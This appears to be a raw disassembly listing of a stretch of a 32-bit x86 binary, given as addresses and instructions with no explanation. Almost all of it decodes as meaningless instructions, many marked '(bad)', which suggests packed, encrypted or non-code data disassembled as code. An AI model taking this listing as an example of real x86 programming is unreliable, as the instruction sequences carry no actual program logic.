  40b993:	sbb    DWORD PTR [esi+0x69],0x37f77441
  40b99a:	sub    eax,0xb213fd9
  40b99f:	cmp    esp,DWORD PTR [ecx+0x38c47822]
  40b9a5:	inc    esp
  40b9a6:	(bad)  
  40b9a8:	cwde   
  40b9a9:	xor    eax,0x7bf99f60
  40b9ae:	sbb    ah,0x70
  40b9b1:	add    ebx,DWORD PTR [edx-0x64115c17]
  40b9b7:	push   DWORD PTR [ecx]
  40b9b9:	sbb    eax,0xec82c0aa
  40b9be:	leave  
  40b9bf:	cli    
  40b9c0:	(bad)  
  40b9c1:	pop    ebx
  40b9c2:	dec    esi
  40b9c3:	outs   dx,BYTE PTR ds:[esi]
  40b9c4:	inc    edx
  40b9c5:	outs   dx,BYTE PTR ds:[esi]
  40b9c6:	dec    esi
  40b9c7:	jl     0x40b9ac
  40b9c9:	ins    BYTE PTR es:[edi],dx
  40b9ca:	inc    ebp
  40b9cb:	mov    esi,DWORD PTR [ebp+0x53]
  40b9ce:	ja     0x40ba21
  40b9d0:	sbb    al,bh
  40b9d2:	arpl   WORD PTR [eax],bx
  40b9d4:	jns    0x40b9bc
  40b9d6:	add    edi,DWORD PTR [ebx]
  40b9d8:	push   esp
  40b9d9:	div    BYTE PTR [edi-0x57d8138e]
  40b9df:	sub    eax,0x4d99d837
  40b9e4:	mov    dl,0xf2
  40b9e6:	scas   eax,DWORD PTR es:[edi]
  40b9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e8:	sar    ecx,0x56
  40b9eb:	jns    0x40b9f1
  40b9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ee:	inc    esi
  40b9ef:	(bad)  
  40b9f0:	jnp    0x40ba4b
  40b9f2:	mov    ecx,0xe27e56
  40b9f7:	add    eax,0x9566cac0
  40b9fc:	inc    ecx
  40b9fd:	pop    edi
  40b9fe:	xor    eax,0x4095e7c6
  40ba03:	xchg   esp,eax
  40ba04:	xor    al,0x6b
  40ba06:	int3   
  40ba07:	jl     0x40b9c3
  40ba09:	jmp    0x63d0:0xc7e0dd02
  40ba10:	hlt    
  40ba11:	xchg   esi,eax
  40ba12:	cs pop edi
  40ba14:	hlt    
  40ba15:	cmc    
  40ba16:	cmc    
  40ba17:	inc    ebp
  40ba18:	cmp    al,0xd6
  40ba1a:	jge    0x40ba47
  40ba1c:	dec    eax
  40ba1d:	in     al,0xef
  40ba1f:	sbb    dl,BYTE PTR [ebx-0x1c93d7b2]
  40ba25:	push   esi
  40ba26:	(bad)  
  40ba27:	bound  ebx,QWORD PTR [esi+ebp*8-0x59]
  40ba2b:	(bad)
  40ba2f:	add    BYTE PTR [ecx],0xef
  40ba32:	mov    ds:0x6c684d65,eax
  40ba37:	outs   dx,DWORD PTR ds:[esi]
  40ba38:	pop    ebp
  40ba39:	(bad)  
  40ba3a:	out    dx,al
  40ba3b:	jl     0x40b9d8
  40ba3d:	xor    al,0x9e
  40ba3f:	mov    bh,0x83
  40ba41:	pop    ebx
  40ba42:	mov    esi,0x8b65cb17
  40ba47:	xor    al,0xcf
  40ba49:	inc    eax
  40ba4a:	mov    edx,0xf252c969
  40ba4f:	xlat   BYTE PTR ds:[ebx]
  40ba50:	mov    BYTE PTR [edi-0x5e],0x27
  40ba54:	mov    ds:0xbccfb207,eax
  40ba59:	dec    edx
  40ba5a:	sbb    edx,ebp
  40ba5c:	jae    0x40ba0a
  40ba5e:	jnp    0x40bac8
  40ba60:	add    ebp,ebx
  40ba62:	pop    ss
  40ba63:	sub    eax,0x430492f3
  40ba68:	pop    ss
  40ba69:	inc    edi
  40ba6a:	mov    eax,0xe8709a24
  40ba6f:	sub    DWORD PTR [ebx-0xa5e22f9],0xa27f9512
  40ba79:	inc    esp
  40ba7a:	xchg   edx,eax
  40ba7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba7c:	arpl   WORD PTR [esi+0x3a7df75d],cx
  40ba82:	pop    edx
  40ba83:	outs   dx,DWORD PTR ds:[esi]
  40ba84:	imul   ebx,DWORD PTR [ebp+0x5a35a471],0x7b792568
  40ba8e:	or     eax,0x3f38d24e
  40ba93:	pop    ecx
  40ba94:	push   esi
  40ba95:	inc    ebx
  40ba96:	test   ebp,0x4340224b
  40ba9c:	cmp    BYTE PTR [edi+ebx*4+0x35e401c0],bh
  40baa3:	mov    dh,0xec
  40baa5:	push   ebx
  40baa6:	jmp    DWORD PTR [esi]
  40baa8:	sbb    BYTE PTR [edx-0x12146bf],al
  40baae:	jg     0x40ba50
  40bab0:	sbb    DWORD PTR [edx],ebx
  40bab2:	pop    ecx
  40bab3:	and    al,0x71
  40bab5:	call   0x20620983
  40baba:	nop
  40babb:	scas   al,BYTE PTR es:[edi]
  40babc:	push   esp
  40babd:	cmp    al,0xef
  40babf:	sub    al,0x4e
  40bac1:	fidiv  DWORD PTR [esi]
  40bac3:	xor    edi,DWORD PTR [eax-0x3165bfdf]
  40bac9:	or     BYTE PTR [edx+0x77],dh
  40bacc:	inc    ebx
  40bacd:	dec    eax
  40bace:	push   esi
  40bacf:	xchg   ebx,eax
  40bad0:	fdivr  QWORD PTR [ecx+ebp*8+0x68fe767f]
  40bad7:	cmp    BYTE PTR [esi+0x7e6dddf1],dl
  40badd:	pop    esi
  40bade:	inc    edx
  40badf:	or     eax,esi
  40bae1:	dec    ebx
  40bae2:	mov    ah,0x83
  40bae4:	lahf   
  40bae5:	aaa    
  40bae6:	mov    ebp,0xcb9e7b53
  40baeb:	retf   0xd53c
  40baee:	enter  0x411,0x37
  40baf2:	lods   al,BYTE PTR ds:[esi]
  40baf3:	and    ah,BYTE PTR [edx+edi*8-0x49]
  40baf7:	loopne 0x40bb25
  40baf9:	pop    ss
  40bafa:	mov    eax,ds:0xb2bb321e
  40baff:	shl    BYTE PTR [eax+0x59],1
  40bb02:	and    al,0x0
  40bb04:	mov    bl,0xc5
  40bb06:	and    eax,0x4450d342
  40bb0b:	out    dx,eax
  40bb0c:	(bad)  [esi]
  40bb0e:	push   0x1e
  40bb10:	(bad)  
  40bb11:	mov    dl,0xa7
  40bb13:	sbb    al,ch
  40bb15:	in     al,dx
  40bb16:	out    0x39,eax
  40bb18:	aam    0x86
  40bb1a:	push   esp
  40bb1b:	xlat   BYTE PTR ds:[ebx]
  40bb1c:	pop    ss
  40bb1d:	(bad)  
  40bb1e:	fimul  WORD PTR [ecx+0x2fce8ca]
  40bb24:	pop    ecx
  40bb25:	imul   esp,DWORD PTR [eax-0x30],0x51f8c2c4
  40bb2c:	sub    eax,0x5e525c01
  40bb31:	mov    ecx,0x114de4ae
  40bb36:	push   esp
  40bb37:	mov    esi,0xbca9c5e4
  40bb3c:	add    DWORD PTR [edi-0x29403848],0x70444918
  40bb46:	or     al,0xcb
  40bb48:	arpl   WORD PTR [edx+0x5ac15885],bp
  40bb4e:	outs   dx,BYTE PTR ds:[esi]
  40bb4f:	loop   0x40bb59
  40bb51:	mov    BYTE PTR es:[ebx+0x5f],ch
  40bb55:	es dec edi
  40bb57:	call   0xbc90:0x71f21af8
  40bb5e:	fstp   DWORD PTR [esi]
  40bb60:	data16 jo 0x40bb2a
  40bb63:	mov    dl,0x6
  40bb65:	fstp   QWORD PTR [esi-0x434fa876]
  40bb6b:	pop    edi
  40bb6c:	scas   al,BYTE PTR es:[edi]
  40bb6d:	mov    dh,0x94
  40bb6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb70:	stos   BYTE PTR es:[edi],al
  40bb71:	scas   eax,DWORD PTR es:[edi]
  40bb72:	es inc edi
  40bb74:	inc    edi
  40bb75:	sbb    eax,eax
  40bb77:	push   es
  40bb78:	aaa    
  40bb79:	and    ebx,DWORD PTR [ebx+0x5b]
  40bb7c:	imul   esp,edi,0xffffffe9
  40bb7f:	enter  0xe6ef,0x84
  40bb83:	sahf   
  40bb84:	mov    ch,0x9
  40bb86:	mov    dl,0xc4
  40bb88:	pushf  
  40bb89:	int    0x9d
  40bb8b:	mov    bh,0xac
  40bb8d:	test   al,0xc1
  40bb8f:	addr16 inc ebx
  40bb91:	mov    ds:0x4a68890a,eax
  40bb96:	pop    edx
  40bb97:	push   eax
  40bb98:	push   cs
  40bb99:	xor    eax,0xd3e46cdd
  40bb9e:	(bad)  
  40bba0:	int3   
  40bba1:	test   al,ch
  40bba3:	pop    ebx
  40bba4:	inc    eax
  40bba5:	out    0x14,al
  40bba7:	jge    0x40bc0b
  40bba9:	mov    esp,0xee530b95
  40bbae:	ds xor eax,0xd6bfe91f
  40bbb4:	sbb    eax,DWORD PTR [edi-0x4cd310aa]
  40bbba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbbb:	add    al,0xac
  40bbbd:	inc    ebx
  40bbbe:	add    BYTE PTR [esi],0x28
  40bbc1:	adc    bh,BYTE PTR [edx+0x2770ff4a]
  40bbc7:	adc    DWORD PTR [bp+di],ebx
  40bbca:	adc    ch,bh
  40bbcc:	mov    ds:0x754d2a2f,al
  40bbd1:	mov    ebx,ebp
  40bbd3:	mov    ds:0x7fcf171c,al
  40bbd8:	gs addr16 dec ecx
  40bbdb:	inc    esi
  40bbdc:	enter  0xdcb1,0x18
  40bbe0:	adc    DWORD PTR [ebp+0x4388fd26],eax
  40bbe6:	dec    ebp
  40bbe7:	add    al,0xbb
  40bbe9:	push   0xab65ff50
  40bbee:	push   ds
  40bbef:	mov    eax,0x596611e2
  40bbf4:	add    ebp,DWORD PTR [ebp+0x76a635f]
  40bbfa:	add    dl,BYTE PTR [ebx+0x71]
  40bbfd:	out    dx,al
  40bbfe:	scas   eax,DWORD PTR es:[edi]
  40bbff:	scas   eax,DWORD PTR es:[edi]
  40bc00:	retf   
  40bc01:	cmp    ebp,DWORD PTR [edx]
  40bc03:	mov    bh,0x36
  40bc05:	and    al,BYTE PTR [ecx-0x38]
  40bc08:	jle    0x40bbc8
  40bc0a:	enter  0xed49,0xf
  40bc0e:	jge    0x40bbbb
  40bc10:	jno    0x40bbd5
  40bc12:	cdq    
  40bc13:	inc    ecx
  40bc14:	in     eax,0x16
  40bc16:	outs   dx,DWORD PTR ds:[esi]
  40bc17:	test   al,0xbf
  40bc19:	in     eax,dx
  40bc1a:	mov    edx,0xb5eb12d4
  40bc1f:	call   FWORD PTR [ebx-0x634284b2]
  40bc25:	test   bh,al
  40bc27:	jns    0x40bc11
  40bc29:	sbb    BYTE PTR [esi],bh
  40bc2b:	jle    0x40bc21
  40bc2d:	lock sub edi,eax
  40bc30:	hlt    
  40bc31:	je     0x40bc77
  40bc33:	inc    ebx
  40bc34:	or     ch,BYTE PTR [ebp-0x6efe9b3a]
  40bc3a:	stc    
  40bc3b:	in     eax,dx
  40bc3c:	cld    
  40bc3d:	outs   dx,DWORD PTR ds:[esi]
  40bc3e:	das    
  40bc3f:	dec    ebp
  40bc40:	cld    
  40bc41:	lahf   
  40bc42:	fucomp st(0)
  40bc44:	mov    ebx,cs
  40bc46:	cmp    eax,0x27af4f71
  40bc4b:	mov    ah,al
  40bc4d:	inc    edi
  40bc4e:	xor    BYTE PTR ds:0xc1e6ee21,bh
  40bc54:	sub    al,0x85
  40bc56:	cmp    DWORD PTR [edx+0x373ecbdb],edi
  40bc5c:	std    
  40bc5d:	sbb    dh,dl
  40bc5f:	scas   eax,DWORD PTR es:[edi]
  40bc60:	xor    BYTE PTR [edi],dl
  40bc62:	aad    0x7
  40bc64:	inc    eax
  40bc65:	daa    
  40bc66:	out    0x90,eax
  40bc68:	mov    esp,0xed9e90b0
  40bc6d:	(bad)  
  40bc6e:	push   cs
  40bc6f:	notrack call edi
  40bc72:	xchg   esi,eax
  40bc73:	dec    edi
  40bc74:	enter  0x4b9e,0x4a
  40bc78:	sbb    ebp,DWORD PTR [edx]
  40bc7a:	imul   edi,DWORD PTR [ebx-0x16],0xdff4f24b
  40bc81:	aas    
  40bc82:	pop    eax
  40bc83:	test   al,0xe4
  40bc85:	clc    
  40bc86:	sub    ebx,ebx
  40bc88:	jmp    0x40bc9e
  40bc8a:	int    0xb5
  40bc8c:	mov    ds:0x95a6c9da,al
  40bc91:	xchg   BYTE PTR [edx+0x5e],bh
  40bc94:	sub    ecx,DWORD PTR [ecx+eiz*4]
  40bc97:	ja     0x40bcf8
  40bc99:	pushf  
  40bc9a:	leave  
  40bc9b:	jmp    DWORD PTR [eax+esi*4-0x1261c96a]
  40bca2:	dec    ecx
  40bca3:	jmp    0x40bc56
  40bca5:	push   ds
  40bca6:	push   0x2be205b6
  40bcab:	fistp  QWORD PTR [ebx]
  40bcad:	fimul  DWORD PTR [ebx-0x79f037ab]
  40bcb3:	add    eax,DWORD PTR [eax]
  40bcb5:	add    BYTE PTR [eax],al
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	lahf   
  40bcd3:	push   esi
  40bcd4:	xor    DWORD PTR [edi-0x1c],0x707e7e8e
  40bcdb:	jns    0x40bd5b
  40bcdd:	jle    0x40bc7a
  40bcdf:	mov    edx,0xba60d2f8
  40bce4:	lds    edx,FWORD PTR [ebp+0x333c39d2]
  40bcea:	sbb    dl,0xf5
  40bced:	js     0x40bd44
  40bcef:	lods   eax,DWORD PTR ds:[esi]
  40bcf0:	and    BYTE PTR [edx],ch
  40bcf2:	hlt    
  40bcf3:	mov    ebp,0x6742e1d9
  40bcf8:	ret    
  40bcf9:	dec    ebp
  40bcfa:	out    0xc3,al
  40bcfc:	fiadd  WORD PTR [ebx+0x13]
  40bcff:	dec    edx
  40bd00:	xchg   DWORD PTR [ebp-0x7d],eax
  40bd03:	dec    esp
  40bd04:	jbe    0x40bcec
  40bd06:	add    DWORD PTR [ebp+edx*1+0x10],ebx
  40bd0a:	imul   edi,esp,0x24
  40bd0d:	jbe    0x40bcc0
  40bd0f:	xor    al,0xcd
  40bd11:	lahf   
  40bd12:	stos   DWORD PTR es:[edi],eax
  40bd13:	iret   
  40bd14:	jae    0x40bc97
  40bd16:	jns    0x40bd5a
  40bd18:	clc    
  40bd19:	mov    bl,BYTE PTR ds:0xcd56982f
  40bd1f:	lds    ecx,FWORD PTR [ebx+0x69]
  40bd22:	push   ebx
  40bd23:	lock inc esi
  40bd25:	mov    al,ds:0x6cc464a1
  40bd2a:	push   esp
  40bd2b:	lock inc ebp
  40bd2d:	in     al,dx
  40bd2e:	xor    bh,BYTE PTR [ecx]
  40bd30:	pop    edi
  40bd31:	and    edi,DWORD PTR [edx+0x23]
  40bd34:	mov    dl,0xce
  40bd36:	cli    
  40bd37:	repz sbb al,0x72
  40bd3a:	jecxz  0x40bd6b
  40bd3c:	rol    DWORD PTR [eax],0xb
  40bd3f:	jmp    0x40bd24
  40bd41:	call   0x6da3:0xbd95c0cd
  40bd48:	dec    esi
  40bd49:	ret    0x6a31
  40bd4c:	jb     0x40bce5
  40bd4e:	imul   BYTE PTR [eax]
  40bd50:	xchg   ecx,eax
  40bd51:	ja     0x40bda7
  40bd53:	sub    al,al
  40bd55:	jg     0x40bd50
  40bd57:	out    dx,al
  40bd58:	jb     0x40bdb4
  40bd5a:	in     eax,0xe1
  40bd5c:	xchg   esi,eax
  40bd5d:	jmp    0xa56a07bf
  40bd62:	fld    TBYTE PTR [ecx+0x5dbbb536]
  40bd68:	add    dh,BYTE PTR [ebp-0x4bcc5632]
  40bd6e:	jle    0x40bd53
  40bd70:	jle    0x40bdc0
  40bd72:	cmp    ah,bl
  40bd74:	sbb    DWORD PTR [ebp+0x6be8e4f8],eax
  40bd7a:	mov    esi,0x5fa1d11e
  40bd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd80:	sbb    DWORD PTR [edx-0x2c],edx
  40bd83:	push   esp
  40bd84:	cmp    esi,DWORD PTR [ecx+edx*1-0x158c42fd]
  40bd8b:	test   BYTE PTR [ebx],cl
  40bd8d:	aam    0x51
  40bd8f:	int    0x0
  40bd91:	ss int 0x92
  40bd94:	mov    edi,ss
  40bd96:	aas    
  40bd97:	xor    DWORD PTR [eax+esi*1-0x409c575e],ebx
  40bd9e:	sub    ah,BYTE PTR [edx-0x1d]
  40bda1:	sbb    bl,BYTE PTR [ecx+0xc]
  40bda4:	mov    esp,0xc168b12d
  40bda9:	inc    ecx
  40bdaa:	sub    al,0x33
  40bdac:	(bad)  
  40bdad:	xchg   esi,eax
  40bdae:	out    0x2f,al
  40bdb0:	dec    ebp
  40bdb1:	cmp    ebp,DWORD PTR ds:0x8bd53242
  40bdb7:	sbb    ebx,DWORD PTR [edx-0x3ce3ea]
  40bdbd:	or     al,0x2a
  40bdbf:	nop
  40bdc0:	mul    dl
  40bdc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc3:	inc    esi
  40bdc4:	push   ds
  40bdc5:	jns    0x40bdbd
  40bdc7:	lods   eax,DWORD PTR ds:[esi]
  40bdc8:	popa   
  40bdc9:	retf   0xeef2
  40bdcc:	in     al,0x90
  40bdce:	ret    0x272
  40bdd1:	adc    al,0x4b
  40bdd3:	and    BYTE PTR [eax],cl
  40bdd5:	repz mov ebx,0xb3e9908c
  40bddb:	pop    edx
  40bddc:	jmp    0x40be55
  40bdde:	or     dh,BYTE PTR [ebp+0x13]
  40bde1:	xor    DWORD PTR [esi],ecx
  40bde3:	cmp    dh,BYTE PTR [esi+0x73]
  40bde6:	retf   
  40bde7:	jnp    0x40be1e
  40bde9:	popa   
  40bdea:	jb     0x40be00
  40bdec:	test   al,0xa7
  40bdee:	cli    
  40bdef:	pop    ebp
  40bdf0:	mov    DWORD PTR [edi-0x61],ecx
  40bdf3:	mul    DWORD PTR [ebx+0x21f40441]
  40bdf9:	push   ebx
  40bdfa:	test   BYTE PTR ds:0x42829cf5,al
  40be00:	je     0x40bdf4
  40be02:	out    dx,al
  40be03:	mov    edx,0x51753ad5
  40be08:	fadd   QWORD PTR es:[ecx-0xfffbfad]
  40be0f:	sti    
  40be10:	fisttp DWORD PTR [ebp+0x25]
  40be13:	cmp    BYTE PTR [eax],cl
  40be15:	retf   0x78ef
  40be18:	xchg   ebp,eax
  40be19:	call   0x8a531217
  40be1e:	bound  ecx,QWORD PTR [edi]
  40be20:	push   ds
  40be21:	ss hlt 
  40be23:	pop    edx
  40be24:	outs   dx,BYTE PTR ds:[esi]
  40be25:	into   
  40be26:	int    0xfd
  40be28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be29:	dec    ecx
  40be2a:	dec    ebx
  40be2b:	dec    ebp
  40be2c:	mov    eax,ds:0xa195adbd
  40be31:	(bad)
  40be34:	js     0x40bddc
  40be36:	xor    ah,BYTE PTR ds:0xf87034d6
  40be3c:	popf   
  40be3d:	cmp    BYTE PTR [esi],al
  40be3f:	sub    BYTE PTR [edi+ebx*8],bh
  40be42:	jae    0x40be08
  40be44:	add    ch,BYTE PTR [ebx-0x40]
  40be47:	add    eax,0x6192302b
  40be4c:	clts   
  40be4e:	add    DWORD PTR [ebx],ebp
  40be50:	or     dh,al
  40be52:	rcl    DWORD PTR [esi],cl
  40be54:	pop    es
  40be55:	addr16 sbb al,0xd6
  40be58:	fisttp DWORD PTR ds:0xb4c1f08c
  40be5e:	push   0xffffffe9
  40be60:	jbe    0x40bde6
  40be62:	mov    eax,ds:0x907e1a12
  40be67:	lds    esi,FWORD PTR [edi]
  40be69:	outs   dx,DWORD PTR ds:[esi]
  40be6a:	dec    esp
  40be6b:	scas   eax,DWORD PTR es:[edi]
  40be6c:	xor    al,0x18
  40be6e:	sub    al,0x11
  40be70:	add    DWORD PTR [edx],esi
  40be72:	jo     0x40be95
  40be74:	int    0x71
  40be76:	xchg   DWORD PTR [ebx-0x39],eax
  40be79:	push   edx
  40be7a:	adc    al,0x16
  40be7c:	ret    
  40be7d:	dec    ebx
  40be7e:	mov    al,ds:0x54e69852
  40be83:	sub    esp,edx
  40be85:	xor    dh,BYTE PTR [esi+0x5ac58f9a]
  40be8b:	mov    ecx,eax
  40be8d:	into   
  40be8e:	enter  0xe074,0x83
  40be92:	shl    DWORD PTR ds:0xd087b541,1
  40be98:	sub    edx,DWORD PTR [eax]
  40be9a:	dec    edi
  40be9b:	xor    DWORD PTR [ebp-0x52],eax
  40be9e:	and    DWORD PTR gs:[ecx+0x1bb358ad],ebx
  40bea5:	push   0xcaae8f3f
  40beaa:	sbb    ch,dl
  40beac:	out    dx,al
  40bead:	repnz scas al,BYTE PTR es:[di]
  40beb0:	jo     0x40bef6
  40beb2:	jns    0x40be3e
  40beb4:	sbb    DWORD PTR [edi-0x19211bc7],0xe823e6cd
  40bebe:	adc    al,0x84
  40bec0:	cmc    
  40bec1:	jns    0x40be9b
  40bec3:	hlt    
  40bec4:	neg    DWORD PTR [edi+0x43d7bcc9]
  40beca:	inc    edi
  40becb:	pop    edx
  40becc:	mov    ch,0x76
  40bece:	fwait
  40becf:	mov    eax,ds:0xd6c9bb45
  40bed4:	fdivrp st(4),st
  40bed6:	call   0xec07648a
  40bedb:	jnp    0x40bee6
  40bedd:	hlt    
  40bede:	popa   
  40bedf:	cmc    
  40bee0:	jmp    0x40bed3
  40bee2:	rol    BYTE PTR [edx],0x8
  40bee5:	fistp  DWORD PTR [esi-0x19f9973c]
  40beeb:	ds add cl,bl
  40beee:	rcr    DWORD PTR [ebx+edi*4+0x8],0xef
  40bef3:	and    BYTE PTR [ebx-0x3],al
  40bef6:	fucomp st(5)
  40bef8:	inc    eax
  40bef9:	sub    al,0xac
  40befb:	ja     0x40bf0b
  40befd:	(bad)  
  40befe:	jmp    0xdafabbd9
  40bf03:	daa    
  40bf04:	jb     0x40be9a
  40bf06:	pop    ss
  40bf07:	pop    esi
  40bf08:	and    edx,esi
  40bf0a:	(bad)  
  40bf0b:	aam    0xc8
  40bf0d:	mov    cl,0xf
  40bf0f:	push   edi
  40bf10:	dec    ebx
  40bf11:	mov    bh,0x25
  40bf13:	xchg   esp,eax
  40bf14:	sbb    al,0x74
  40bf16:	sub    cl,dh
  40bf18:	mov    ds:0x8da57336,al
  40bf1d:	mov    DWORD PTR [eax+0x3b],0xb21a2f0a
  40bf24:	in     al,0x1b
  40bf26:	xor    eax,0x7aff1723
  40bf2b:	(bad)  
  40bf2d:	data16 repnz addr16 loope 0x40bef6
  40bf32:	add    DWORD PTR [eax+0x329bdca1],eax
  40bf38:	jo     0x40beeb
  40bf3a:	icebp  
  40bf3b:	xchg   esp,eax
  40bf3c:	arpl   WORD PTR [esi+0xc],dx
  40bf3f:	cld    
  40bf40:	bound  esi,QWORD PTR [edx+0x7f752adb]
  40bf46:	mov    ebx,0x8eb05830
  40bf4b:	mov    ecx,0xcf31cede
  40bf50:	sar    BYTE PTR [ebx+0x739b273c],1
  40bf56:	mov    dl,al
  40bf58:	and    BYTE PTR [ecx*4-0x374a2c10],al
  40bf5f:	(bad)  
  40bf60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf61:	repnz ins DWORD PTR es:[edi],dx
  40bf63:	dec    ebx
  40bf64:	nop
  40bf65:	add    eax,0xf1722634
  40bf6a:	sub    BYTE PTR [ebp+0x8],bh
  40bf6d:	push   0xf894d030
  40bf72:	jne    0x40bfe3
  40bf74:	push   esi
  40bf75:	or     esi,DWORD PTR [ebx+0x845cb0e]
  40bf7b:	rcr    DWORD PTR [ebp+eiz*8+0x37],1
  40bf7f:	ret    0x5cea
  40bf82:	inc    esi
  40bf83:	cli    
  40bf84:	les    eax,FWORD PTR [ecx-0x56e9a0de]
  40bf8a:	std    
  40bf8b:	or     eax,0x2d9734a6
  40bf90:	call   0x39a6aaaa
  40bf95:	pop    esp
  40bf96:	test   eax,0x9c6d017c
  40bf9b:	(bad)  
  40bf9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf9d:	mov    bl,0x4e
  40bf9f:	push   cs
  40bfa0:	jne    0x40bfd5
  40bfa2:	xchg   ebx,eax
  40bfa3:	sbb    DWORD PTR [ebx+eiz*1+0x31dc9ad6],0xfffffff1
  40bfab:	add    DWORD PTR [ecx],edi
  40bfad:	div    ecx
  40bfaf:	add    eax,0xff1a0494
  40bfb4:	shr    DWORD PTR [eax-0x2d433e0a],1
  40bfba:	dec    ebp
  40bfbb:	add    al,0xb5
  40bfbd:	mov    ebx,0x355ed1d3
  40bfc2:	stos   DWORD PTR es:[edi],eax
  40bfc3:	sub    dl,BYTE PTR [eax+0x7b362b0a]
  40bfc9:	call   0x1363:0xd374ef9f
  40bfd0:	fadd   DWORD PTR [esi-0x4c229ffd]
  40bfd6:	pop    edx
  40bfd7:	jmp    0xd56e485
  40bfdc:	addr16 mov dl,0xa7
  40bfdf:	(bad)  
  40bfe1:	adc    esp,esp
  40bfe3:	stc    
  40bfe4:	jne    0x40bf85
  40bfe6:	sub    al,BYTE PTR [eax+0x129055f6]
  40bfec:	repz sbb edx,DWORD PTR [ebp+0x530fd535]
  40bff3:	xchg   edx,eax
  40bff4:	ins    BYTE PTR es:[edi],dx
  40bff5:	and    al,0x58
  40bff7:	cwde   
  40bff8:	jae    0x40c04e
  40bffa:	sbb    edx,edx
  40bffc:	push   es
  40bffd:	(bad)  
  40bffe:	or     DWORD PTR [ecx+edx*2+0x274bf072],edi
  40c005:	xor    ebx,DWORD PTR [edx]
  40c007:	jne    0x40c017
  40c009:	clc    
  40c00a:	fild   WORD PTR [eax+esi*4-0x18ada1d0]
  40c011:	fld    DWORD PTR [ecx+0x507fbf73]
  40c017:	adc    al,0x8
  40c019:	pop    ecx
  40c01a:	add    dl,BYTE PTR [eax-0x1a]
  40c01d:	out    0xcc,al
  40c01f:	pop    ebp
  40c020:	jbe    0x40c081
  40c022:	xor    al,0x3c
  40c024:	call   FWORD PTR [edx]
  40c026:	jb     0x40c062
  40c028:	add    ah,ch
  40c02a:	xor    DWORD PTR [esi+ebp*4],ecx
  40c02d:	out    dx,al
  40c02e:	xchg   ecx,eax
  40c02f:	(bad)  
  40c030:	lods   al,BYTE PTR ds:[esi]
  40c031:	scas   eax,DWORD PTR es:[edi]
  40c032:	mov    ch,0xd2
  40c034:	call   0x656ec598
  40c039:	imul   ebp,DWORD PTR [edi-0x7a],0xffffff96
  40c03d:	(bad)  
  40c03e:	xor    DWORD PTR [edi+0x36],ebx
  40c041:	push   eax
  40c042:	mov    dh,0x56
  40c044:	mov    al,bh
  40c046:	test   BYTE PTR [ebx],dh
  40c048:	add    BYTE PTR [edx-0x32],bl
  40c04b:	daa    
  40c04c:	push   edi
  40c04d:	shl    WORD PTR [eax+0x523636cc],1
  40c054:	pop    esp
  40c055:	mov    ch,0x5c
  40c057:	aad    0xdf
  40c059:	loop   0x40c059
  40c05b:	scas   eax,DWORD PTR es:[edi]
  40c05c:	pop    es
  40c05d:	test   DWORD PTR [eax],esi
  40c05f:	shl    DWORD PTR [eax-0x18242394],cl
  40c065:	mov    edx,0x2dc505bb
  40c06a:	push   edi
  40c06b:	addr16 enter 0xad6f,0x72
  40c070:	add    ebp,DWORD PTR [ecx+ecx*1+0x4]
  40c074:	push   esi
  40c075:	dec    ecx
  40c076:	xchg   edx,eax
  40c077:	push   cs
  40c078:	push   ss
  40c079:	retf   
  40c07a:	sub    al,0x33
  40c07c:	iret   
  40c07d:	inc    esi
  40c07e:	mov    esi,0x4bb9d238
  40c083:	jg     0x40c08d
  40c085:	arpl   WORD PTR [eax-0x56451355],di
  40c08b:	or     BYTE PTR [edx],bh
  40c08d:	xor    ah,BYTE PTR [ebx]
  40c08f:	cmovo  eax,DWORD PTR [ebp-0x56]
  40c093:	rcl    DWORD PTR [ecx],1
  40c095:	rol    DWORD PTR [eax+0x53],1
  40c098:	hlt    
  40c099:	and    DWORD PTR ds:0xf54,edi
  40c09e:	leave  
  40c09f:	and    DWORD PTR [ebp+0x14],esi
  40c0a2:	and    DWORD PTR [edi],ebp
  40c0a4:	dec    edx
  40c0a5:	daa    
  40c0a6:	adc    eax,0x45153173
  40c0ab:	je     0x40c11b
  40c0ad:	test   al,0xd0
  40c0af:	cli    
  40c0b0:	mov    ebp,0x98e8ca72
  40c0b5:	xchg   esp,eax
  40c0b6:	pop    esi
  40c0b7:	push   cs
  40c0b8:	(bad)  
  40c0b9:	aad    0x6b
  40c0bb:	dec    esp
  40c0bc:	ror    BYTE PTR [edx-0x5da1e585],cl
  40c0c2:	pop    edx
  40c0c3:	rcr    ecx,0x32
  40c0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0c7:	sti    
  40c0c8:	ja     0x40c149
  40c0ca:	(bad)  
  40c0cb:	(bad)  
  40c0cc:	lds    ebx,FWORD PTR [edi+ecx*4]
  40c0cf:	mov    eax,0x52f80fe2
  40c0d4:	loop   0x40c12f
  40c0d6:	jecxz  0x40c102
  40c0d8:	add    edi,ecx
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	rcl    BYTE PTR [ebp+ecx*4+0x26],1
  40c0f0:	sahf   
  40c0f1:	fimul  WORD PTR [edx+0x79707e7e]
  40c0f7:	jle    0x40c177
  40c0f9:	loop   0x40c100
  40c0fb:	jge    0x40c0b9
  40c0fd:	hlt    
  40c0fe:	sub    ch,BYTE PTR es:[esi+0xdd6be36]
  40c105:	ins    BYTE PTR es:[edi],dx
